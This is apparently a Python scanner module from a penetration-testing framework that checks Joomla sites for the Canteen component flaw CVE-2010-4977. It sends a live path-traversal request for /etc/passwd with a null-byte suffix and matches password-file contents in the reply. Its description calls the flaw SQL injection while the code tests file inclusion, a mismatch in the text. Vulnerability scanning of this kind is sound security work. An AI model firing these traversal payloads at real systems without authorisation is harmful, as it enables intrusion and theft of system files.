#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A SQL injection vulnerability in menu."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component Canteen 1.0 - Local File Inclusion Detection',
        'description': 'A SQL injection vulnerability in menu.php in the Canteen (com_canteen) component 1.0 for Joomla! allows remote attackers to execute arbitrary SQL commands via the mealid parameter to index.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'joomla', 'lfi', 'edb', 'packetstorm', 'miniwork', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/34250',
            'https://nvd.nist.gov/vuln/detail/CVE-2010-4977',
            'http://www.salvatorefresta.net/files/adv/Canteen%20Joomla%20Component%201.0%20Multiple%20Remote%20Vulnerabilities-04072010.txt',
            'http://packetstormsecurity.org/1007-exploits/joomlacanteen-lfisql.txt',
            'http://securityreason.com/securityalert/8495',
        ],
        'cve': 'CVE-2010-4977',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_canteen&controller=../../../../../etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Component Canteen 1.0 - Local File Inclusion detected",
                path='/index.php?option=com_canteen&controller=../../../../../etc/passwd%00',
            )
            return True
        return False

